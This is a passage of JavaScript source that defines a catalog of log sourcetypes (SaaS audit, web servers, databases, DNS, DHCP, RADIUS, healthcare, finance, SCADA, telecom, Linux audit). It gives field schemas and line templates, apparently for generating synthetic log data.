  'hubspot:audit': { v:'HubSpot', p:'CRM', f:'json', fl:'ts user action:s:LOGIN,CREATE,UPDATE,DELETE,EXPORT,IMPORT object:s:Contact,Company,Deal,Ticket,Email status:s:SUCCESS,FAILURE src_ip' },
  'segment:track': { v:'Segment', p:'CDP', f:'json', fl:'ts user uuid event:s:Page_View,Button_Click,Form_Submit,Purchase,Sign_Up,Search source:s:web,ios,android,server properties:s' },
  'amplitude:event': { v:'Amplitude', p:'Analytics', f:'json', fl:'ts user uuid event_type:s:page_view,button_click,search,purchase,sign_up,video_play platform:s:web,ios,android country:s:US,GB,DE,JP,BR,IN' },
  'launchdarkly:audit': { v:'LaunchDarkly', p:'Feature Flags', f:'json', fl:'ts user action:s:createFlag,updateFlag,deleteFlag,toggleFlag,createSegment,updateRules flag:s project:s environment:s:production,staging,development status:s:on,off' },
  'datadog:apm': { v:'Datadog', p:'APM', f:'json', fl:'ts host service:s:web,api,worker,scheduler,cache resource:s:GET_/api/v1/users,POST_/api/v1/orders,GET_/health duration:i:1000-30000000 status:i:200-503 error:i:0-1' },
  'sentry:event': { v:'Sentry', p:'Error Tracking', f:'json', fl:'ts host level:s:fatal,error,warning,info platform:s:python,javascript,java,go,ruby title:s user environment:s:production,staging,development uuid' },
  'contentful:audit': { v:'Contentful', p:'CMS', f:'json', fl:'ts user action:s:create,update,delete,publish,unpublish,archive entity_type:s:Entry,Asset,ContentType,Environment space:s status:s:success,failure' },
  'vercel:log': { v:'Vercel', p:'Platform', f:'json', fl:'ts host method:s:GET,POST,PUT,DELETE path:s status:i:200-503 duration:i:1-30000 region:s:iad1,sfo1,cdg1,hnd1,gru1 src_ip' },
  'netlify:audit': { v:'Netlify', p:'Platform', f:'json', fl:'ts user action:s:deploy,build,settings_update,dns_update,domain_add site:s status:s:ready,building,error,enqueued uuid' },
  'mongodb_atlas:audit': { v:'MongoDB', p:'Atlas', f:'json', fl:'ts user src_ip action:s:authenticate,find,insert,update,remove,createCollection,dropCollection db:s collection:s status:s:0,13,18' },
  'redis_cloud:log': { v:'Redis', p:'Cloud', f:'json', fl:'ts user src_ip command:s:GET,SET,DEL,HGET,LPUSH,SADD,SUBSCRIBE,CONFIG database:s status:s:ok,err,noperm' },
  'confluent:audit': { v:'Confluent', p:'Cloud', f:'json', fl:'ts user src_ip action:s:kafka.CreateTopics,kafka.Produce,kafka.Consume,kafka.DeleteTopics resource:s:topic,cluster,connector environment:s status:s:SUCCESS,DENIED' },
  'elastic_cloud:audit': { v:'Elastic', p:'Cloud', f:'json', fl:'ts user src_ip action:s:deployment.create,deployment.delete,deployment.update,user.login,api_key.create deployment:s status:s:success,failure' },

  // ===== WEB SERVERS ADDITIONS =====
  'caddy:access': { v:'Caddy', p:'Server', f:'json', fl:'ts client_ip host method:s:GET,POST,PUT,DELETE,PATCH path:s status:i:200-503 bytes:i:0-1048576 duration:f:0.001-30 proto:s:HTTP/1.1,HTTP/2,HTTP/3 ua' },
  'litespeed:access': { v:'LiteSpeed', p:'Web Server', f:'text', fl:'ts client_ip host user method:s:GET,POST,PUT,DELETE path:s status:i:200-503 bytes:i:0-1048576 referer:s ua', tpl:'{{client_ip}} - {{user}} [{{ts}}] "{{method}} {{path}} HTTP/1.1" {{status}} {{bytes}} "{{referer}}" "{{ua}}"' },
  'tomcat:access': { v:'Apache', p:'Tomcat', f:'text', fl:'ts client_ip user method:s:GET,POST,PUT,DELETE path:s status:i:200-503 bytes:i:0-1048576 duration:i:1-30000', tpl:'{{client_ip}} - {{user}} [{{ts}}] "{{method}} {{path}} HTTP/1.1" {{status}} {{bytes}} {{duration}}' },
  'gunicorn:access': { v:'Gunicorn', p:'WSGI', f:'text', fl:'ts client_ip method:s:GET,POST,PUT,DELETE path:s status:i:200-503 bytes:i:0-1048576 ua', tpl:'{{client_ip}} - - [{{ts}}] "{{method}} {{path}} HTTP/1.1" {{status}} {{bytes}} "-" "{{ua}}"' },
  'varnish:access': { v:'Varnish', p:'Cache', f:'text', fl:'ts client_ip method:s:GET,POST,HEAD path:s status:i:200-503 bytes:i:0-1048576 hit:s:hit,miss,pass,pipe backend:s', tpl:'{{client_ip}} - - [{{ts}}] "{{method}} {{path}} HTTP/1.1" {{status}} {{bytes}} "{{hit}}" "{{backend}}"' },

  // ===== DATABASE ADDITIONS =====
  'cassandra:log': { v:'Apache', p:'Cassandra', f:'text', fl:'ts level:s:INFO,WARN,ERROR,DEBUG host thread:s:main,CompactionExecutor,ReadStage,MutationStage,GossipStage msg:s:Compacting,Compacted,Starting,Completed,GC keyspace:s', tpl:'{{level}} [{{thread}}] {{ts}} {{msg}} keyspace={{keyspace}}' },
  'neo4j:log': { v:'Neo4j', p:'Graph DB', f:'text', fl:'ts level:s:INFO,WARN,ERROR host thread:s:main,bolt-worker,cypher-worker msg:s query:s duration:i:1-30000', tpl:'{{ts}} {{level}} [{{thread}}] {{msg}}' },
  'influxdb:log': { v:'InfluxData', p:'InfluxDB', f:'text', fl:'ts level:s:info,warn,error,debug host component:s:tsm1,httpd,retention,wal msg:s db:s measurement:s', tpl:'ts={{ts}} lvl={{level}} msg="{{msg}}" db={{db}} component={{component}}' },
  'clickhouse:log': { v:'ClickHouse', p:'OLAP', f:'text', fl:'ts level:s:Information,Warning,Error,Debug,Trace host thread:i:1-100 query_id:uuid msg:s duration:i:1-300000', tpl:'{{ts}} [ {{thread}} ] <{{level}}> {{msg}} (query_id: {{query_id}})' },
  'cockroachdb:log': { v:'Cockroach Labs', p:'CockroachDB', f:'json', fl:'ts level:s:I,W,E,F host node:i:1-20 msg:s channel:s:SQL_EXEC,SQL_PERF,DEV,OPS,HEALTH,SESSIONS goroutine:i:1-1000' },
  'yugabyte:log': { v:'Yugabyte', p:'YugabyteDB', f:'text', fl:'ts level:s:I,W,E,F host pid:i:1-65535 thread:i:1-1000 component:s:tablet,master,tserver,raft msg:s', tpl:'{{level}}{{ts}} {{pid}} {{component}}] {{msg}}' },
  'vitess:log': { v:'Vitess', p:'MySQL Scaling', f:'json', fl:'ts level:s:INFO,WARNING,ERROR,FATAL component:s:vtgate,vttablet,vtctld,mysqlctl msg:s keyspace:s shard:s tablet:s' },
  'mariadb:audit': { v:'MariaDB', p:'Server', f:'csv', fl:'ts user host db:s operation:s:CONNECT,QUERY,READ,WRITE,CREATE,ALTER,DROP status:i:0-1146 query:s', tpl:'{{ts}},{{user}},{{host}},{{db}},{{operation}},{{query}},{{status}}' },
  'presto:log': { v:'Presto', p:'SQL Engine', f:'json', fl:'ts level:s:INFO,WARN,ERROR host query_id:uuid user catalog:s:hive,mysql,postgres,memory state:s:QUEUED,RUNNING,FINISHED,FAILED rows:i:0-1000000 bytes:i:0-1073741824' },
  'druid:log': { v:'Apache', p:'Druid', f:'json', fl:'ts level:s:INFO,WARN,ERROR host service:s:broker,coordinator,overlord,historical,middleManager msg:s datasource:s duration:i:1-300000' },

  // ===== MESSAGING ADDITIONS =====
  'activemq:log': { v:'Apache', p:'ActiveMQ', f:'text', fl:'ts level:s:INFO,WARN,ERROR host component:s:Transport,Broker,Queue,Topic msg:s connection:s destination:s', tpl:'{{ts}} {{level}} [{{component}}] {{msg}}' },
  'nats:log': { v:'NATS', p:'Server', f:'text', fl:'ts level:s:INF,WRN,ERR,DBG,TRC host cid:i:1-99999 msg:s subject:s bytes:i:1-1048576', tpl:'[{{ts}}] [{{level}}] [{{cid}}] {{msg}}' },
  'pulsar:log': { v:'Apache', p:'Pulsar', f:'text', fl:'ts level:s:INFO,WARN,ERROR host component:s:broker,bookkeeper,zookeeper,proxy msg:s topic:s namespace:s', tpl:'{{ts}} [{{component}}] {{level}} {{msg}} topic={{topic}}' },
  'celery:log': { v:'Celery', p:'Task Queue', f:'text', fl:'ts level:s:INFO,WARNING,ERROR,DEBUG host task:s:send_email,process_order,generate_report,sync_data,cleanup status:s:PENDING,STARTED,SUCCESS,FAILURE,RETRY uuid', tpl:'[{{ts}}: {{level}}/MainProcess] Task {{task}}[{{uuid}}] {{status}}' },

  // ===== CONTAINER ADDITIONS =====
  'podman:event': { v:'Podman', p:'Container Engine', f:'json', fl:'ts host type:s:container,pod,image,volume,network action:s:create,start,stop,remove,pull,push name:s status:s:0,1,125,126,137 uuid' },
  'containerd:log': { v:'containerd', p:'Runtime', f:'text', fl:'ts level:s:info,warn,error,debug host namespace:s:default,k8s.io,moby msg:s', tpl:'time="{{ts}}" level={{level}} msg="{{msg}}" namespace={{namespace}}' },
  'rancher:audit': { v:'Rancher', p:'Manager', f:'json', fl:'ts user src_ip action:s:create,update,delete,login,logout resource:s:cluster,project,namespace,workload,secret cluster:s status:i:200-403' },
  'openshift:audit': { v:'Red Hat', p:'OpenShift', f:'json', fl:'ts user src_ip verb:s:get,list,create,update,delete,watch resource:s:pods,deployments,routes,builds,imagestreams namespace:s status:i:200-403' },
  'nomad:event': { v:'HashiCorp', p:'Nomad', f:'json', fl:'ts host type:s:Node,Job,Allocation,Evaluation,Deployment action:s:register,deregister,alloc,plan,apply status:s:running,pending,complete,failed,dead' },
  'portainer:audit': { v:'Portainer', p:'CE', f:'json', fl:'ts user action:s:login,deploy,update,remove,restart resource_type:s:container,stack,image,volume,network resource:s status:s:success,failure src_ip' },

  // ===== MONITORING ADDITIONS =====
  'icinga:event': { v:'Icinga', p:'Monitoring', f:'json', fl:'ts host severity:s:OK,WARNING,CRITICAL,UNKNOWN service:s:CPU,Memory,Disk,HTTP,DNS,SMTP,SSH check_result:s attempt:i:1-5 output:s' },
  'librenms:alert': { v:'LibreNMS', p:'Network Monitor', f:'json', fl:'ts host severity:s:ok,warning,critical rule:s entity:s value:s timestamp:ts' },
  'checkmk:event': { v:'Checkmk', p:'Monitoring', f:'json', fl:'ts host severity:s:OK,WARN,CRIT,UNKNOWN service:s:CPU_Load,Memory,Disk_IO,Interface,Process check_result:s state_type:s:HARD,SOFT attempt:i:1-5' },
  'prtg:event': { v:'Paessler', p:'PRTG', f:'json', fl:'ts host severity:s:Up,Warning,Down,Unusual,Unknown sensor:s:Ping,HTTP,CPU_Load,Disk_Free,Bandwidth,Memory group:s value:s message:s' },
  'logicmonitor:alert': { v:'LogicMonitor', p:'Platform', f:'json', fl:'ts host severity:s:warn,error,critical type:s:datapoint,eventsource,batchjob datapoint:s value:s threshold:s alert_id:i:1-999999' },
  'catchpoint:test': { v:'Catchpoint', p:'DEM', f:'json', fl:'ts host test_type:s:Web,API,DNS,Traceroute,BGP,Ping status:s:0,1,2 response_time:i:1-30000 availability:f:0-100 node:s:NewYork,London,Tokyo,Sydney' },
  'appdynamics:event': { v:'AppDynamics', p:'APM', f:'json', fl:'ts host severity:s:INFO,WARNING,ERROR,CRITICAL type:s:APPLICATION_ERROR,SLOW_TRANSACTION,STALL,DEADLOCK,MEMORY_LEAK app_name:s tier:s node:s' },
  'jaeger:span': { v:'Jaeger', p:'Tracing', f:'json', fl:'ts host service:s:api-gateway,user-service,order-service,payment-service,notification-service operation:s duration:i:1000-30000000 status:i:0-2 trace_id:sid span_id:sid' },
  'zipkin:span': { v:'Zipkin', p:'Tracing', f:'json', fl:'ts host service:s:frontend,backend,database,cache,queue,auth name:s duration:i:1000-30000000 kind:s:CLIENT,SERVER,PRODUCER,CONSUMER trace_id:sid span_id:sid' },

  // ===== DNS ADDITIONS =====
  'powerdns:log': { v:'PowerDNS', p:'Server', f:'text', fl:'ts client_ip host query:s query_type:s:A,AAAA,CNAME,MX,TXT,NS,SOA,SRV rcode:s:NoError,NXDomain,ServFail,Refused bytes:i:40-4096', tpl:'{{ts}} {{host}} pdns[]: Remote {{client_ip}} wants {{query}}|{{query_type}}, rcode={{rcode}}, bytes={{bytes}}' },
  'coredns:log': { v:'CoreDNS', p:'DNS', f:'text', fl:'ts client_ip host query:s query_type:s:A,AAAA,CNAME,MX,TXT rcode:s:NOERROR,NXDOMAIN,SERVFAIL,REFUSED duration:f:0.001-5 bytes:i:40-4096', tpl:'[INFO] {{client_ip}} - {{query}} {{query_type}} {{rcode}} {{bytes}} {{duration}}s' },
  'unbound:log': { v:'NLnet Labs', p:'Unbound', f:'text', fl:'ts client_ip host query:s query_type:s:A,AAAA,CNAME,MX,TXT,NS rcode:s:noerror,nxdomain,servfail cached:s:yes,no', tpl:'{{ts}} unbound: {{client_ip}} {{query}} {{query_type}} {{rcode}} cached={{cached}}' },
  'pihole:log': { v:'Pi-hole', p:'DNS Sinkhole', f:'text', fl:'ts client_ip host query:s query_type:s:A,AAAA,CNAME,ANY status:s:forwarded,blocked,cached,gravity client:s', tpl:'{{ts}} dnsmasq: {{status}} {{query}} is {{client_ip}} ({{query_type}})' },
  'adguard:log': { v:'AdGuard', p:'Home', f:'json', fl:'ts client_ip host query:s query_type:s:A,AAAA,CNAME status:s:Processed,Filtered,SafeBrowsing,ParentalControl filter_id:i:0-100 elapsed:f:0.001-5' },
  'cloudflare_dns:log': { v:'Cloudflare', p:'DNS', f:'json', fl:'ts client_ip query:s query_type:s:A,AAAA,CNAME,MX,TXT response_code:i:0-5 coloName:s:DFW,ORD,LAX,SFO,IAD,AMS,LHR,FRA,NRT,SIN' },

  // ===== DHCP =====
  'isc_dhcp:log': { v:'ISC', p:'DHCP Server', f:'syslog', fl:'ts host action:s:DHCPDISCOVER,DHCPOFFER,DHCPREQUEST,DHCPACK,DHCPNAK,DHCPRELEASE,DHCPINFORM client_mac:md5 client_ip lease_ip:ip iface:s:eth0,eth1,bond0', tpl:'{{ts}} {{host}} dhcpd: {{action}} from {{client_mac}} via {{iface}}: lease {{lease_ip}}' },
  'kea_dhcp:log': { v:'ISC', p:'Kea DHCP', f:'json', fl:'ts host action:s:DHCP4_LEASE_ALLOC,DHCP4_LEASE_RENEW,DHCP4_LEASE_EXPIRE,DHCP4_DECLINE client_mac:md5 client_ip lease_ip:ip subnet_id:i:1-100' },
  'windows_dhcp:log': { v:'Microsoft', p:'DHCP Server', f:'csv', fl:'ts host action:s:Assign,Renew,Release,NAK,Decline client_ip client_mac:md5 hostname:s scope:s', tpl:'{{action}},{{ts}},{{client_ip}},{{hostname}},{{client_mac}},,,{{scope}},,,' },

  // ===== RADIUS/AUTH =====
  'freeradius:log': { v:'FreeRADIUS', p:'Server', f:'text', fl:'ts user client_ip status:s:Access-Accept,Access-Reject,Access-Challenge nas_ip:ip nas_port:i:1-65535 service:s:Framed-User,Login-User,Callback-Login', tpl:'{{ts}} Auth: ({{status}}) Login {{status}} [{{user}}] (from client {{client_ip}} port {{nas_port}})' },
  'cisco_tacacs:log': { v:'Cisco', p:'TACACS+', f:'syslog', fl:'ts user client_ip host action:s:Authentication,Authorization,Accounting status:s:Pass,Fail,Error service:s:shell,system,raccess priv_level:i:0-15', tpl:'{{ts}} {{host}} tacacsd: {{action}} {{status}} for {{user}} from {{client_ip}} service={{service}} priv={{priv_level}}' },
  'clearpass:auth': { v:'Aruba', p:'ClearPass', f:'json', fl:'ts user client_ip client_mac:md5 status:s:ACCEPT,REJECT,TIMEOUT service:s:802.1X,MAB,WebAuth,RADIUS role:s:Employee,Guest,Contractor,IOT nas_ip:ip' },

  // ===== BACKUP ADDITIONS =====
  'acronis:event': { v:'Acronis', p:'Cyber Protect', f:'json', fl:'ts host user action:s:backup_started,backup_completed,backup_failed,restore_started,scan_completed status:s:ok,error,warning,running plan:s size:i:1048576-1099511627776' },
  'cohesity:event': { v:'Cohesity', p:'DataProtect', f:'json', fl:'ts host action:s:kBackup,kRestore,kClone,kReplication status:s:kSuccess,kFailure,kRunning,kCanceled source:s target:s bytes:i:1048576-1099511627776' },
  'zerto:event': { v:'Zerto', p:'DR', f:'json', fl:'ts host event:s:VPG_Created,Recovery_Started,Recovery_Completed,Failover_Test,Alert_Triggered vpg:s site:s status:s:Normal,Warning,Error' },
  'druva:event': { v:'Druva', p:'Data Resiliency', f:'json', fl:'ts user host action:s:backup_success,backup_failed,restore_initiated,snapshot_created,anomaly_detected device:s status:s:success,failure,in_progress bytes:i:1048576-1099511627776' },

  // ===== ENDPOINT MANAGEMENT =====
  'intune:audit': { v:'Microsoft', p:'Intune', f:'json', fl:'ts user action:s:DeviceEnrolled,PolicyAssigned,AppDeployed,ComplianceCheck,WipeRequested device:s os:s:Windows,iOS,Android,macOS status:s:Success,Failure,Pending compliance:s:Compliant,NonCompliant,InGracePeriod' },
  'workspace_one:event': { v:'VMware', p:'Workspace ONE', f:'json', fl:'ts user device:s action:s:Enrolled,CheckedIn,ComplianceChanged,AppInstalled,ProfilePushed os:s:Windows,iOS,Android,macOS compliance:s:Compliant,NonCompliant' },
  'bigfix:action': { v:'HCL', p:'BigFix', f:'json', fl:'ts host action:s:FixletBecameRelevant,ActionStarted,ActionCompleted,ComplianceCheck fixlet_id:i:1-999999 status:s:Running,Completed,Failed,Expired severity:s:Critical,Important,Moderate,Low' },
  'ninjaone:event': { v:'NinjaOne', p:'RMM', f:'json', fl:'ts host user action:s:DeviceOnline,DeviceOffline,PatchInstalled,AlertTriggered,ScriptRun,BackupCompleted severity:s:none,minor,major,critical status:s' },
  'kandji:event': { v:'Kandji', p:'Apple MDM', f:'json', fl:'ts device:s user action:s:enrolled,checked_in,blueprint_applied,app_installed,os_updated status:s:success,failure,pending compliance:s:pass,fail,unknown' },
  'fleet:result': { v:'Fleet', p:'osquery Manager', f:'json', fl:'ts host user query:s:processes,users,listening_ports,file_events,interface_addresses status:s:0,1 rows:i:0-1000 platform:s:darwin,linux,windows' },

  // ===== NETWORK MGMT =====
  'solarwinds:event': { v:'SolarWinds', p:'NPM', f:'json', fl:'ts host severity:s:Information,Warning,Critical entity:s:Node,Interface,Volume,Application event:s:NodeDown,HighCPU,InterfaceDown,DiskFull,Rebooted status:s:Up,Down,Warning,Critical' },
  'auvik:event': { v:'Auvik', p:'Network Mgmt', f:'json', fl:'ts host severity:s:info,warning,error,critical device_type:s:Switch,Router,Firewall,AP,Server event:s:DeviceDown,ConfigChange,InterfaceDown,NewDevice status:s:up,down,degraded' },
  'netbox:changelog': { v:'NetBox', p:'DCIM', f:'json', fl:'ts user action:s:created,updated,deleted object_type:s:dcim.device,ipam.ipaddress,dcim.interface,circuits.circuit,tenancy.tenant object:s src_ip' },
  'observium:alert': { v:'Observium', p:'NMS', f:'json', fl:'ts host severity:s:crit,warn,info entity_type:s:port,mempool,processor,storage,sensor alert:s status:s:alert,recover' },

  // ===== SD-WAN =====
  'viptela:event': { v:'Cisco', p:'Viptela SD-WAN', f:'json', fl:'ts host severity:s:minor,major,critical,emergency event:s:control-up,control-down,omp-peer-state-change,bfd-state-change system_ip:ip site_id:i:100-99999' },
  'velocloud:event': { v:'VMware', p:'VeloCloud SD-WAN', f:'json', fl:'ts host severity:s:INFO,WARNING,ERROR,CRITICAL event:s:LINK_UP,LINK_DOWN,EDGE_UP,EDGE_DOWN,HA_FAILOVER,VPN_TUNNEL_UP edge:s enterprise:s' },
  'silverpeak:event': { v:'Aruba', p:'EdgeConnect SD-WAN', f:'json', fl:'ts host severity:s:info,warning,minor,major,critical event:s:tunnel_up,tunnel_down,boost_applied,qos_violation,failover appliance:s' },
  'fortinet_sdwan:event': { v:'Fortinet', p:'FortiGate SD-WAN', f:'json', fl:'ts host severity:s:information,warning,alert,critical action:s:sla-pass,sla-fail,link-up,link-down,failover interface:s sla:s rule:s' },

  // ===== HEALTHCARE =====
  'epic:audit': { v:'Epic', p:'EHR', f:'json', fl:'ts user src_ip action:s:Login,Logout,PatientAccess,OrderEntry,ChartReview,Prescribe patient_id:sid department:s status:s:success,failure' },
  'cerner:audit': { v:'Cerner', p:'Millennium', f:'json', fl:'ts user src_ip action:s:Login,PatientSearch,OrderEntry,ResultReview,DocumentCreate event_type:s:Authentication,DataAccess,OrderManagement status:s:success,failure' },
  'meditech:audit': { v:'MEDITECH', p:'Expanse', f:'json', fl:'ts user src_ip action:s:Login,Logout,PatientAccess,OrderEntry,Discharge module:s:ADM,PHA,LAB,RAD,NUR status:s:success,failure' },
  'dicom:log': { v:'DICOM', p:'Medical Imaging', f:'json', fl:'ts src_ip dst_ip action:s:C-STORE,C-FIND,C-MOVE,C-GET,C-ECHO modality:s:CT,MR,US,XR,CR,PT study_uid:uuid status:s:success,failure,warning' },

  // ===== FINANCIAL =====
  'swift:audit': { v:'SWIFT', p:'Alliance', f:'json', fl:'ts user src_ip action:s:Login,MessageSent,MessageReceived,Recall,Acknowledge message_type:s:MT103,MT202,MT940,MT950 status:s:Accepted,Rejected,Pending bic:s' },
  'fix:log': { v:'FIX', p:'Protocol', f:'text', fl:'ts sender:s target:s msg_type:s:NewOrderSingle,ExecutionReport,OrderCancelRequest,MarketData,Heartbeat symbol:s side:s:Buy,Sell,Short quantity:i:1-100000 price:f:1-10000', tpl:'8=FIX.4.4|35={{msg_type}}|49={{sender}}|56={{target}}|55={{symbol}}|54={{side}}|38={{quantity}}|44={{price}}|' },

  // ===== INDUSTRIAL/SCADA ADDITIONS =====
  'opcua:log': { v:'OPC Foundation', p:'OPC UA', f:'json', fl:'ts src_ip action:s:Read,Write,Browse,Subscribe,Call node_id:s status:s:Good,Bad,Uncertain namespace:i:0-10 value:s' },
  'iec61850:log': { v:'IEC', p:'61850', f:'json', fl:'ts src_ip dst_ip action:s:GOOSE,MMS_Read,MMS_Write,Report,Control ied:s dataset:s status:s:success,failure' },
  'profinet:log': { v:'Siemens', p:'PROFINET', f:'json', fl:'ts src_ip dst_ip action:s:Read,Write,Alarm,Diagnosis station:s slot:i:0-16 subslot:i:0-8 status:s:ok,error' },
  'ethercat:log': { v:'Beckhoff', p:'EtherCAT', f:'json', fl:'ts host action:s:SDO_Read,SDO_Write,PDO_Mapping,State_Change slave:i:1-128 state:s:INIT,PREOP,SAFEOP,OP status:s:ok,error' },

  // ===== TELECOM =====
  'diameter:log': { v:'3GPP', p:'Diameter', f:'json', fl:'ts src_ip dst_ip command:s:CER,CEA,DWR,DWA,CCR,CCA,AAR,AAA app_id:s:Gx,Gy,Rx,S6a result:i:2001-5012 session_id:sid' },
  'sip:log': { v:'SIP', p:'VoIP', f:'text', fl:'ts src_ip dst_ip method:s:INVITE,ACK,BYE,REGISTER,OPTIONS,CANCEL,INFO status:i:100-603 call_id:sid from:user to:user', tpl:'{{method}} sip:{{to}}@{{dst_ip}} SIP/2.0\r\nFrom: {{from}}\r\nTo: {{to}}\r\nCall-ID: {{call_id}}' },
  'ss7:log': { v:'ITU', p:'SS7/SIGTRAN', f:'json', fl:'ts src_ip dst_ip message_type:s:IAM,ACM,ANM,REL,RLC,MAP_SRI,MAP_SAI,MAP_ISD opc:i:1-16383 dpc:i:1-16383 status:s:success,failure' },
  'smpp:log': { v:'SMPP', p:'SMS Gateway', f:'json', fl:'ts src_ip action:s:submit_sm,deliver_sm,bind_transceiver,unbind,enquire_link status:i:0-255 source:s destination:s message_id:sid' },

  // ===== VIRTUALIZATION =====
  'vmware:vsphere': { v:'VMware', p:'vSphere', f:'json', fl:'ts host user event:s:VmPoweredOnEvent,VmPoweredOffEvent,VmMigratedEvent,VmCreatedEvent,DrsVmMigratedEvent,TaskEvent vm:s datacenter:s cluster:s' },
  'proxmox:log': { v:'Proxmox', p:'VE', f:'json', fl:'ts host user action:s:qmstart,qmstop,qmmigrate,qmcreate,vzdump,pveproxy severity:s:info,warning,error vmid:i:100-999 node:s' },
  'nutanix:audit': { v:'Nutanix', p:'AHV', f:'json', fl:'ts user src_ip action:s:vm.create,vm.power_on,vm.power_off,vm.migrate,vm.delete,snapshot.create entity:s cluster:s status:s:succeeded,failed' },
  'openstack:log': { v:'OpenStack', p:'Nova', f:'json', fl:'ts host user action:s:create,delete,start,stop,pause,resume,migrate,resize instance:s project:s status:s:active,build,error,deleted,shutoff' },
  'hyper_v:event': { v:'Microsoft', p:'Hyper-V', f:'json', fl:'ts host event:s:VmStart,VmStop,VmMigrate,VmCheckpoint,VmReplication vm:s status:s:OK,Warning,Critical,Operating source:s' },

  // ===== SERVICE MESH =====
  'istio:access': { v:'Istio', p:'Service Mesh', f:'json', fl:'ts src_ip dst_ip method:s:GET,POST,PUT,DELETE path:s status:i:200-503 duration:i:1-30000 src_workload:s dst_workload:s response_flags:s:NONE,UO,UF,URX,DC' },
  'linkerd:access': { v:'Linkerd', p:'Service Mesh', f:'json', fl:'ts src_ip dst_ip method:s:GET,POST,PUT,DELETE path:s status:i:200-503 duration:i:1-30000 authority:s tls:s:true,false' },
  'consul_connect:log': { v:'HashiCorp', p:'Consul Connect', f:'json', fl:'ts src_ip dst_ip action:s:allow,deny,intention service:s upstream:s intention:s namespace:s:default,production,staging' },
  'kong:access': { v:'Kong', p:'API Gateway', f:'json', fl:'ts client_ip method:s:GET,POST,PUT,DELETE,PATCH path:s status:i:200-503 latency:i:1-30000 service:s route:s consumer:s authenticated:s:true,false' },
  'apigee:access': { v:'Google', p:'Apigee', f:'json', fl:'ts client_ip method:s:GET,POST,PUT,DELETE path:s status:i:200-503 latency:i:1-30000 proxy:s developer:s product:s' },

  // ===== LINUX/UNIX ADVANCED =====
  'systemd:journal': { v:'systemd', p:'Journal', f:'json', fl:'ts host priority:i:0-7 facility:i:0-23 unit:s:sshd,nginx,docker,kubelet,cron,systemd-logind pid:i:1-65535 msg:s' },
  'selinux:audit': { v:'SELinux', p:'Audit', f:'text', fl:'ts host action:s:denied,granted scontext:s tcontext:s tclass:s:file,dir,process,socket,capability comm:s path:s', tpl:'type=AVC msg=audit({{ts}}): avc: {{action}} { read write } for comm="{{comm}}" path="{{path}}" scontext={{scontext}} tcontext={{tcontext}} tclass={{tclass}}' },
  'apparmor:log': { v:'AppArmor', p:'LSM', f:'text', fl:'ts host action:s:ALLOWED,DENIED,AUDITED profile:s operation:s:open,read,write,exec,mknod name:s pid:i:1-65535 comm:s', tpl:'{{ts}} kernel: audit: type=1400 apparmor="{{action}}" operation="{{operation}}" profile="{{profile}}" name="{{name}}" pid={{pid}} comm="{{comm}}"' },
  'pam:auth': { v:'Linux', p:'PAM', f:'syslog', fl:'ts host user action:s:authentication,session,account,password status:s:success,failure service:s:sshd,sudo,login,su,gdm src_ip', tpl:'{{ts}} {{host}} {{service}}(pam_unix)[]: {{action}} {{status}} for user {{user}} from {{src_ip}}' },

  // ===== COMPLIANCE/PRIVACY =====
  'onetrust:event': { v:'OneTrust', p:'Privacy', f:'json', fl:'ts user action:s:ConsentGiven,ConsentWithdrawn,DSRSubmitted,AssessmentCompleted purpose:s:Marketing,Analytics,Functional,Essential status:s:completed,pending,rejected' },
  'bigid:scan': { v:'BigID', p:'Data Intelligence', f:'json', fl:'ts scan_type:s:discovery,classification,correlation,remediation source:s category:s:PII,PHI,PCI,Financial,IP findings:i:0-10000 status:s:completed,running,failed' },
  'varonis:alert': { v:'Varonis', p:'DatAdvantage', f:'json', fl:'ts user src_ip severity:s:Low,Medium,High,Critical category:s:Abnormal_Behavior,Data_Exfiltration,Privilege_Escalation,Stale_Data path:s action:s status:s:new,under_investigation,closed' },

  // ===== CISCO ASA (popular firewall) =====
  'cisco:asa': { v:'Cisco', p:'ASA', f:'syslog', fl:'ts src_ip dst_ip src_port dst_port action:s:Built,Teardown,Denied proto:tcp,udp,icmp acl:s:inside_access_in,outside_access_in,dmz_access_in iface_in:s:inside,outside,dmz iface_out:s:inside,outside,dmz bytes:i:60-524288 duration:i:0-86400', tpl:'{{ts}} %ASA-6-302013: {{action}} {{proto}} connection for {{iface_in}}:{{src_ip}}/{{src_port}} to {{iface_out}}:{{dst_ip}}/{{dst_port}} duration {{duration}} bytes {{bytes}}' },

  // ===== LINUX AUDITD =====
  'linux:auditd': { v:'Linux', p:'Audit Daemon', f:'text', fl:'ts host user action:s:SYSCALL,EXECVE,CWD,PATH,USER_AUTH,USER_LOGIN,USER_CMD,CRED_ACQ,CRED_DISP exe:s:/usr/bin/sudo,/usr/bin/ssh,/usr/bin/passwd,/usr/sbin/useradd,/bin/bash,/usr/bin/su pid:i:1-65535 uid:i:0-65535 success:s:yes,no', tpl:'type={{action}} msg=audit({{ts}}): pid={{pid}} uid={{uid}} exe="{{exe}}" success={{success}} user={{user}} host={{host}}' },
};

// Hydrated catalog cache — lazy populate on first access
const _hydratedCache = {};

function getCatalogDefinition(sourcetype) {
  if (_hydratedCache[sourcetype]) return _hydratedCache[sourcetype];
  const entry = CATALOG[sourcetype];
  if (!entry) return null;
  const def = hydrate(sourcetype, entry);
  _hydratedCache[sourcetype] = def;
  return def;
}


// ============================================================================
// DETAILED DEFINITIONS (embedded) — 5 sourcetypes with full variant support
// ============================================================================

const DEFINITIONS = {
  'pan:traffic': {
    "sourcetype":"pan:traffic","vendor":"Palo Alto Networks","product":"PAN-OS","format":"csv",
    "description":"PAN-OS firewall traffic log",
    "fields":[
      {"name":"recv","type":"timestamp","config":{"format":"YYYY/MM/DD HH:mm:ss","jitterMs":2000}},
      {"name":"serial","type":"serial","config":{"prefix":"00725100","digits":7}},
      {"name":"type","type":"enum","config":{"values":["TRAFFIC"],"weights":[1]}},
      {"name":"subtype","type":"enum","config":{"values":["end","start","drop","deny"],"weights":[0.65,0.2,0.1,0.05]}},
      {"name":"gen","type":"timestamp","config":{"format":"YYYY/MM/DD HH:mm:ss","jitterMs":1000}},
      {"name":"src","type":"ip","config":{"internal":[{"cidr":"10.0.0.0/8","weight":0.5},{"cidr":"192.168.0.0/16","weight":0.3}],"external":[{"cidr":"0.0.0.0/0","weight":0.2}]}},
      {"name":"dst","type":"ip","config":{"internal":[{"cidr":"10.0.0.0/8","weight":0.3}],"external":[{"cidr":"0.0.0.0/0","weight":0.7}]}},
      {"name":"natsrc","type":"ip","config":{"internal":[{"cidr":"198.51.100.0/24","weight":1}]}},
      {"name":"natdst","type":"ip","config":{"internal":[{"cidr":"10.10.0.0/16","weight":1}]}},
